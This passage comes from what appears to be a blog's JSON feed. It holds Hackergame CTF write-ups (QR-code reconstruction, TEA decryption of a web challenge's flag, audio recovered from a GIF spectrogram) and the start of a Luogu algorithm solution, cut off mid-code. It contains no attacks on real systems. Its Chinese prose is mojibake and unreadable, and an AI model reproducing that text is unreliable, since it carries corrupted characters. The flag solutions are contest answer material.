class=\"line\">    res_arr[i+<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i-<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i-<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i+<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i+<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i-<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i-<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i+<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i+<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i-<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i-<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i-<span class=\"number\">2</span>,i+<span class=\"number\">3</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(j-<span class=\"number\">2</span>,j+<span class=\"number\">3</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">abs</span>(x-i)==<span class=\"number\">2</span> <span class=\"keyword\">or</span> <span class=\"built_in\">abs</span>(y-j)==<span class=\"number\">2</span>:</span><br><span class=\"line\">                kimeta[x][y]=<span class=\"number\">1</span></span><br><span class=\"line\">                res_arr[x][y]=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">putRec(<span class=\"number\">28</span>,<span class=\"number\">28</span>)</span><br><span class=\"line\">putRec(<span class=\"number\">28</span>,<span class=\"number\">50</span>)</span><br><span class=\"line\">putRec(<span class=\"number\">50</span>,<span class=\"number\">50</span>)</span><br><span class=\"line\">putRec(<span class=\"number\">50</span>,<span class=\"number\">28</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>,<span class=\"number\">52</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>,<span class=\"number\">55</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i==<span class=\"number\">9</span> <span class=\"keyword\">or</span> i==<span class=\"number\">51</span> <span class=\"keyword\">or</span> j==<span class=\"number\">12</span> <span class=\"keyword\">or</span> j==<span class=\"number\">54</span>:</span><br><span class=\"line\">            kimeta[i][j]=<span class=\"number\">1</span></span><br><span class=\"line\">            res_arr[i][j]=pre_arr[i*QRBLOCK+<span class=\"number\">3</span>][j*QRBLOCK+<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">new_arr =  [[<span class=\"number\">1</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)]</span><br><span class=\"line\">fked =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">cntt = <span class=\"number\">0</span></span><br><span class=\"line\">savecnt=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dfs</span>(<span class=\"params\">i,j</span>):<span class=\"comment\">#ä»é©¬èµ›å…‹å—çš„iè¡Œjåˆ—å¼€å§‹</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> cntt,savecnt</span><br><span class=\"line\">    cntt = cntt+<span class=\"number\">1</span></span><br><span class=\"line\">    LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class=\"line\">    <span class=\"comment\">#è½åœ¨å“ªä¸ªäºŒç»´ç æ–¹å—ä¸Š</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cntt==<span class=\"number\">200000</span>):<span class=\"comment\">#ä¿å­˜ä¸­é€”ç»“æœ</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">                    new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class=\"line\">        MatrixToImage(np.array(new_arr)).save(<span class=\"string\">&#x27;mid%s.bmp&#x27;</span>%savecnt)</span><br><span class=\"line\">        savecnt = savecnt + <span class=\"number\">1</span></span><br><span class=\"line\">        cntt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i&lt;<span class=\"number\">0</span> <span class=\"keyword\">or</span> i&gt;=<span class=\"number\">20</span> <span class=\"keyword\">or</span> j&lt;<span class=\"number\">0</span> <span class=\"keyword\">or</span> j&gt;=<span class=\"number\">20</span> <span class=\"keyword\">or</span> fked[i][j]:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    fked[i][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    nowMin , nowSol = <span class=\"number\">114514191981.0</span> , (<span class=\"number\">1</span>&lt;&lt;(EACH*EACH))-<span class=\"number\">1</span></span><br><span class=\"line\">    tmpp =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            tmpp[x-LUR][y-LUC]=vis[x][y]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> filN <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>&lt;&lt;(EACH*EACH)):<span class=\"comment\">#æšä¸¾æ¯ä¸ªé©¬èµ›å…‹å—å½±å“åˆ°çš„3*3=9ä¸ªQRå—</span></span><br><span class=\"line\">        tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class=\"number\">2</span>][Y+j*MSBLOCK+<span class=\"number\">2</span>],LUR,LUC)<span class=\"comment\">#åŒæ ·æ˜¯ä¹±å†™çš„offset+2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> tmp &lt; <span class=\"number\">0.00000001</span>:</span><br><span class=\"line\">            nowSol = filN</span><br><span class=\"line\">            <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">                <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">                    vis[x][y] = <span class=\"number\">1</span></span><br><span class=\"line\">                    res_arr[x][y]=nowSol&amp;<span class=\"number\">1</span></span><br><span class=\"line\">                    nowSol = nowSol&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((i+<span class=\"number\">1</span>&lt;<span class=\"number\">20</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i+<span class=\"number\">1</span>][j]) <span class=\"keyword\">and</span> dfs(i+<span class=\"number\">1</span>,j)) <span class=\"keyword\">or</span> (j+<span class=\"number\">1</span>&lt;<span class=\"number\">20</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i][j+<span class=\"number\">1</span>]) <span class=\"keyword\">and</span> dfs(i,j+<span class=\"number\">1</span>)) <span class=\"keyword\">or</span> (i-<span class=\"number\">1</span>&gt;=<span class=\"number\">0</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i-<span class=\"number\">1</span>][j]) <span class=\"keyword\">and</span> dfs(i-<span class=\"number\">1</span>,j)) <span class=\"keyword\">or</span> (j-<span class=\"number\">1</span>&gt;=<span class=\"number\">0</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i][j-<span class=\"number\">1</span>]) <span class=\"keyword\">and</span> dfs(i,j-<span class=\"number\">1</span>))):</span><br><span class=\"line\">                fked[i][j]=<span class=\"number\">0</span></span><br><span class=\"line\">                <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">                        vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">            </span><br><span class=\"line\">    fked[i][j]=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#é¢„å…ˆæ‰«æï¼ŒæŠŠèƒ½ç¡®å®šçš„ã€æ²¡æœ‰å¤šè§£çš„å…ˆå¡«ä¸Š</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">        LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class=\"line\">        succnt = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> filN <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>&lt;&lt;(EACH*EACH)):</span><br><span class=\"line\">                tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class=\"number\">2</span>][Y+j*MSBLOCK+<span class=\"number\">2</span>],LUR,LUC)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> tmp &lt; <span class=\"number\">0.00000001</span>:</span><br><span class=\"line\">                    succnt = succnt + <span class=\"number\">1</span></span><br><span class=\"line\">                    nowSol = filN</span><br><span class=\"line\">        <span class=\"keyword\">if</span> succnt == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">                <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">                    kimeta[x][y] = <span class=\"number\">1</span></span><br><span class=\"line\">                    res_arr[x][y]=nowSol&amp;<span class=\"number\">1</span></span><br><span class=\"line\">                    nowSol = nowSol&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">dfs(<span class=\"number\">5</span>,<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">        new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class=\"line\">MatrixToImage(np.array(new_arr)).save(<span class=\"string\">&#x27;resu.bmp&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>æœ€ç»ˆæ•ˆæœï¼š<img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030160204036-1937509495.jpg\" alt=\"QRCode\" loading=\"lazy\"></p>\n<hr>\n<h2 id=\"minecRaft\"><a href=\"#minecRaft\" class=\"headerlink\" title=\"minecRaft\"></a>minecRaft</h2><p>webÃ— reverseâˆš<br>æ‰“å¼€ç½‘é¡µæŸ¥çœ‹jsï¼Œæ‰¾åˆ°flag.jsï¼Œåœ¨<a href=\"http://jsnice.org/\">jsnice.org</a>åæ··æ·†åè‡ªå·±æ‰‹åŠ¨å†æ›¿æ¢ä¸‹å‡ ä¸ªè¿·äººçœ¼çš„å¸¸é‡ï¼Œä¹‹åè¿›è¡Œä»£ç å®¡è®¡ï¼Œä¼šå‘ç°è¿™æ˜¯ä¸ªTEAåŠ å¯†ã€‚å¦‚ä½•å‘ç°æ˜¯TEAå‘¢ï¼Ÿæˆ‘æœäº†å¥½ä¹…ï¼Œåæ¥æœ‰äººå‘Šè¯‰æˆ‘åªéœ€è¦æœå¸¸é‡å°±è¡Œï¼ˆè¿˜éœ€è¦å­¦ä¹ ä¸€ä¸ªäººç”Ÿç»éªŒï¼‰ã€‚<br>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²sï¼Œä½¿å¾—s.encrypt(â€œ{é‚£ä¸²æ•°å­—å¯†é’¥}â€)&#x3D;&#x3D;&#x3D; â€œ6fâ€¦â€¦0câ€<br>æŠŠå¯†æ–‡åˆ‡ç‰‡é¿å…è½¬æ¢åæ•°å­—è¿‡å¤§ï¼Œåœ¨é¢˜ç›®é¡µé¢ä¸‹<code>F12</code>ï¼Œè¿›å…¥Consoleé‡Œæ‰§è¡Œï¼š</p>\n<pre><code class=\"javascript\">window.btoa(LongToStr4(Base16ToLong(&#39;6fbde674&#39;))+LongToStr4(Base16ToLong(&#39;819a59bf&#39;))+LongToStr4(Base16ToLong(&#39;a1209256&#39;))+LongToStr4(Base16ToLong(&#39;5b4ca2a7&#39;))+LongToStr4(Base16ToLong(&#39;a11dc670&#39;))+LongToStr4(Base16ToLong(&#39;c678681d&#39;))+LongToStr4(Base16ToLong(&#39;af4afb67&#39;))+LongToStr4(Base16ToLong(&#39;04b82f0c&#39;)))\n</code></pre>\n<p>å¾—åˆ°å¯†æ–‡dOa9b79ZmoFWkiChp6JMW3DGHaEdaHjGZ&#x2F;tKrwwvuAQ&#x3D;<br>è°·æ­Œ<code>TEA decryption online</code>ï¼Œè¿›å…¥<a href=\"https://www.mefancy.com/obfuscation/encryption-generator.php\">https://www.mefancy.com/obfuscation/encryption-generator.php</a>æŠŠä¸Šé¢é‚£ä¸²æ•°å­—å¯†é’¥ï¼ˆ13â€¦ï¼‰è¿˜æœ‰å¯†æ–‡ä¸¢è¿›å»å°±å‡ºflagäº†ã€‚</p>\n<hr>\n<h2 id=\"pğŸ˜­q\"><a href=\"#pğŸ˜­q\" class=\"headerlink\" title=\"pğŸ˜­q\"></a>pğŸ˜­q</h2><p>è€å¤–å¤§å¥¥æµæ³ª.gif  æ—©çŸ¥é“ï¼Œè¿˜æ˜¯åŸé“.jpg<br>å…ˆæŠŠgifçš„å¸§æå–å‡ºæ¥æ–¹ä¾¿å¤„ç†ï¼š</p>\n<pre><code class=\"python\">import os\nimport sys\nfrom PIL import Image\n\ndef extractFrames(inGif, outFolder):\n    frame = Image.open(inGif)\n    nframes = 0\n    while frame:\n        frame.save(&#39;./dest/%s.png&#39; % (nframes))\n        nframes += 1\n        try:\n            frame.seek(nframes)\n        except EOFError:\n            break;\n    return True\n\nif __name__ == &#39;__main__&#39;:\n    image = os.path.abspath(sys.argv[1])\n    dest = os.path.join(os.path.dirname(image), &quot;dest&quot;)\n    if not os.path.exists(dest):\n        os.mkdir(dest)\n    extractFrames(image, dest)\n</code></pre>\n<p>ç„¶ååŸé¢˜ç»™å•¥åº“å°±ç”¨å•¥åº“ï¼Œé€†å›å»ï¼š</p>\n<pre><code class=\"python\">from array2gif import write_gif  # version: 1.0.4\nimport librosa  # version: 0.8.1\nimport numpy as np  # version: 1.19.5\nimport soundfile as sf\nfrom PIL import Image\nimport matplotlib.pyplot as plt\n\ndef ImageToMatrix(filename):\n    im = Image.open(filename)\n    height,width = im.size\n    im = im.convert(&#39;L&#39;)\n    data = im.getdata()\n    data = np.matrix(data,dtype=&#39;float&#39;)/255.0\n    new_data = np.reshape(data,(width,height))\n    return new_data\nnp.set_printoptions(threshold=1145141919810)\nnum_freqs = 32\nquantize = 2\nmin_db = -60\nmax_db = 30\nfft_window_size = 2048\nframe_step_size = 512\nwindow_function_type = &#39;hann&#39;\nred_pixel = [255, 0, 0]\nwhite_pixel = [255, 255, 255]\nsample_rate = 22050\nlis =  [[0.0 for col in range(587)] for row in range(32)]\nimgg = [[0.0 for col in range(130)] for row in range(92)]\nfor ii in range (0,587):\n    filename = &#39;./dest/%s.png&#39;%ii\n    print(filename)\n    data = ImageToMatrix(filename)\n    for i in range(0,92):\n        for j in range(0,130):\n            imgg[i][j]=data.tolist()[i][j]\n    for xpos in range(0,32):\n        for scan in range(0,92):\n            if imgg[scan][xpos*4+2]&lt;1.0:  \n                lis[xpos][ii]=float((91-scan)-60)\n                break\n\nspectrogram =  np.array(lis)\naudio_signal = librosa.feature.inverse.mel_to_audio(librosa.db_to_power(spectrogram), sr=sample_rate, n_fft=fft_window_size*2, hop_length=frame_step_size, window=window_function_type)\nsf.write(&#39;newnew.wav&#39;, audio_signal, sample_rate) \n</code></pre>\n<p>æœ€ååœ¨Adobe Audition CCé‡Œéšä¾¿å¤„ç†å¤„ç†ï¼Œå‹‰å¼ºèƒ½å¬äº†ï¼Œå¼€å§‹åŠªåŠ›å¬å†™ï¼š<br><code>Theflagis f,l,a,g ......</code>  </p>\n",
            "tags": [
                "Write-Up",
                "Hackergame"
            ]
        },
        {
            "id": "http://cubicy.icu/2019/10/08/%E6%B4%9B%E8%B0%B7P5072%20[Ynoi2015]%E7%9B%BC%E5%90%9B%E5%8B%BF%E5%BF%98/",
            "url": "http://cubicy.icu/2019/10/08/%E6%B4%9B%E8%B0%B7P5072%20[Ynoi2015]%E7%9B%BC%E5%90%9B%E5%8B%BF%E5%BF%98/",
            "title": "æ´›è°·:P5072 [Ynoi2015]ç›¼å›å‹¿å¿˜",
            "date_published": "2019-10-08T12:13:00.000Z",
            "content_html": "<p>åŸé¢˜åœ°å€:<a href=\"https://www.luogu.org/problem/P5072\">https://www.luogu.org/problem/P5072</a>  </p>\n<h3 id=\"é¢˜ç›®ç®€è¿°\"><a href=\"#é¢˜ç›®ç®€è¿°\" class=\"headerlink\" title=\"é¢˜ç›®ç®€è¿°\"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»™å®šä¸€ä¸ªåºåˆ—ï¼Œæ¯æ¬¡æŸ¥è¯¢ä¸€ä¸ªåŒºé—´[l,r]ä¸­æ‰€æœ‰å­åºåˆ—åˆ†åˆ«å»é‡åçš„å’Œmod p</p>\n<hr>\n<h3 id=\"æ€è·¯\"><a href=\"#æ€è·¯\" class=\"headerlink\" title=\"æ€è·¯\"></a>æ€è·¯</h3><p>æˆ‘ä»¬è€ƒè™‘æ¯ä¸ªæ•°çš„è´¡çŒ®ã€‚å³è¯¥åŒºé—´å†…å«æœ‰è¿™ä¸ªæ•°çš„å­åºåˆ—ä¸ªæ•°ã€‚ç”¨è¡¥é›†è½¬åŒ–ä¸ºä¸å«è¿™ä¸ªæ•°çš„å­åºåˆ—ä¸ªæ•°ã€‚<br>é‚£ä¹ˆï¼Œå‡è®¾è¿™ä¸ªæ•°åœ¨[l,r]å†…å‡ºç°äº†kæ¬¡ï¼Œåˆ™ä¸€å…±æœ‰2^(r-l+1) -2^(r-l+1-k)ä¸ªå­åºåˆ—åŒ…å«è¿™ä¸ªæ•°ã€‚<br>æœ¬é¢˜å¯ä»¥ç¦»çº¿ï¼Œå› æ­¤é€‰æ‹©ä½¿ç”¨è«é˜Ÿï¼Œè¿‡ç¨‹ä¸­ç»´æŠ¤cnt[k]è¡¨ç¤ºåŒºé—´å†…æ°å¥½å‡ºç°kæ¬¡çš„æ•°å­—ä¸ªæ•°ï¼Œç»´æŠ¤sum[j]è¡¨ç¤ºåŒºé—´å†…æ°å¥½å‡ºç°jæ¬¡çš„æ•°å­—ä¹‹å’Œï¼ˆåŒºé—´å†…å‡ºç°æ¬¡æ•°ç›¸åŒçš„æ•°ï¼Œå¯¹äºè¿™äº›æ•°ï¼ŒåŒºé—´ä¸­åŒ…å«è¿™äº›æ•°çš„å­åºåˆ—ä¸ªæ•°éƒ½ç›¸åŒï¼Œå› æ­¤å­˜æ•°å­—ä¹‹å’Œå°±è¡Œï¼‰ã€‚<br>ç„¶è€Œè¿™æ ·æ—¶é—´å¤æ‚åº¦ä¸ºO(è¯¢é—®æ¬¡æ•°*å•æ¬¡è¯¢é—®å¤æ‚åº¦)&#x3D;O(n*max(sqrt(n),n))&#x3D;O(nm)ï¼Œå¹¶ä¸å¯è¡Œã€‚æˆ‘ä»¬å‘ç°æ—¶é—´ç“¶é¢ˆä¸åœ¨è«é˜Ÿçš„sqrt(n)ï¼Œè€Œæ˜¯åœ¨å•æ¬¡æŸ¥è¯¢ä¸­æ±‚è§£çš„å¤æ‚åº¦nã€‚<br>æœ‰2ä¸ªå¥—è·¯å¯ä¾›ä½¿ç”¨ï¼šå‡ºç°æ¬¡æ•°å¤§äºsqrt(n)çš„æ•°ä¸è¶…è¿‡sqrt(n)ä¸ªï¼Œå€¼ä¸ä¸º0çš„cnt[k]å°‘äº2*sqrt(n)ä¸ªï¼ˆåè¯æ˜“å¾—ï¼Œæœ¬è´¨ç±»ä¼¼ï¼‰ã€‚ </p>\n<ul>\n<li>å¯¹äºç¬¬ä¸€ä¸ªå¥—è·¯ï¼Œæˆ‘ä»¬åˆ†ç±»è®¨è®ºï¼šå‡ºç°æ¬¡æ•°å°äºç­‰äºsqrt(n)ï¼Œåˆ™ç»Ÿè®¡æ¯ä¸ªå‡ºç°æ¬¡æ•°çš„æ•°å­—ä¹‹å’Œï¼›å¤§äºsqrt(n)çš„ç”¨å“ˆå¸Œè¡¨(unordered_set,C++11)å­˜ä¸‹å…·ä½“çš„æ•°å­—å’Œå…¶å‡ºç°æ¬¡æ•°ã€‚è¿™æ ·æ¯æ¬¡æŸ¥è¯¢æ˜¯sqrt(n)ã€‚  </li>\n<li>ç¬”è€…ä½¿ç”¨çš„åˆ™æ˜¯ç¬¬äºŒä¸ªå¥—è·¯ï¼šval[x]è¡¨ç¤ºå‡ºç°æ¬¡æ•°æ°å¥½ä¸ºxçš„æ•°å­—ä¹‹å’Œï¼ˆåŒä¸Šæ–‡çš„sum[j]ï¼‰ã€‚éšç€è«é˜Ÿl,ræŒ‡é’ˆçš„ç§»åŠ¨ï¼ŒæŠŠæ‰€æœ‰å¯èƒ½å˜ä¸ºé0çš„val[x]è®°ä¸‹æ¥ï¼ŒæŒ‡é’ˆç§»åŠ¨å®Œæ¯•åå†å¯¹å…¶è¿›è¡Œç­›é€‰ï¼ŒæŠŠç¡®å®é0çš„val[x]ä¿ç•™ï¼Œå…¶ä»–å»é™¤ã€‚è¿™æ ·è®¡ç®—å•æ¬¡ç­”æ¡ˆçš„å¤æ‚åº¦å°±ç­‰åŒäºå•æ¬¡æŸ¥è¯¢ä¸­è«é˜ŸæŒ‡é’ˆç§»åŠ¨çš„å¹³å‡æ­¥æ•°ï¼šéƒ½æ˜¯sqrt(n)çº§åˆ«ã€‚è¿™æ ·åšä¸éœ€è¦ç”¨åˆ°å“ˆå¸Œè¡¨ä¹‹ç±»çš„ï¼Œå¸¸æ•°å°äº†å¾ˆå¤šï¼Œç”šè‡³ä¸éœ€è¦è¯»å…¥ä¼˜åŒ–ä¹Ÿèƒ½è½»æ¾è¿‡ã€‚</li>\n</ul>\n<p>è¿˜æ²¡å®Œã€‚æˆ‘ä»¬å‘ç°æ¨¡æ•°æ˜¯ä¸å®šçš„ï¼Œä¸ºäº†ä¿è¯å•æ¬¡æŸ¥è¯¢çš„å¤æ‚åº¦å‹åœ¨sqrt(n)ä»¥å†…ï¼Œæˆ‘ä»¬è¿˜æœ‰æœ€åä¸€ä»¶äº‹æƒ…è¦åšï¼šåœ¨sqrt(n)çš„æ—¶é—´å†…æ±‚å‡º2^(r-l+1) å’Œæ‰€æœ‰çš„2^(r-l+1-k)ã€‚è¿™é‡Œå®‰åˆ©ä¸€ä¸ªç¥å¥‡çš„æ–¹å¼ï¼šæ¯æ¬¡æŸ¥è¯¢åªéœ€è¦åšä¸€æ¬¡æ—¶é—´å¤æ‚åº¦ä¸ºsqrt(n)çš„é¢„å¤„ç†å°±å¯ä»¥O(1)æŸ¥è¯¢äº†ã€‚<br>å‡è®¾æŸ¥è¯¢åŒºé—´é•¿åº¦ä¸ºlen(len&#x3D;r-l+1)ï¼Œæˆ‘ä»¬è®°siz&#x3D;sqrt(len)ï¼Œè€Œåè®¡ç®—2^0 , 2^1 , 2^2 â€¦ 2^sqrt(len)ï¼Œå­˜åœ¨æ•°ç»„pow1ä¸­ï¼›å†è®¡ç®—2^sqrt(len) , 2^(2*sqrt(len)) , 2^(3*sqrt(len)) , 2^(4*sqrt(len))â€¦ , 2^(sqrt(len)*sqrt(len))ï¼Œå­˜åœ¨æ•°ç»„pow[2]ä¸­ã€‚ä»¥ä¸Šè®¡ç®—éƒ½åœ¨mod pæ„ä¹‰ä¸‹è¿›è¡Œã€‚<br>è¿™æ ·æ±‚2çš„ä»»æ„æ¬¡æ–¹éƒ½å¯ä»¥O(1)å‡ºè§£:2^k &#x3D;2^(k&#x2F;siz) *2^(k%siz)&#x3D;pow2[k&#x2F;siz]*pow1[k%siz]ï¼ˆè®°å¾—æ¨¡pï¼‰ã€‚</p>\n<hr>\n<h3 id=\"ä»£ç \"><a href=\"#ä»£ç \" class=\"headerlink\" title=\"ä»£ç \"></a>ä»£ç </h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> 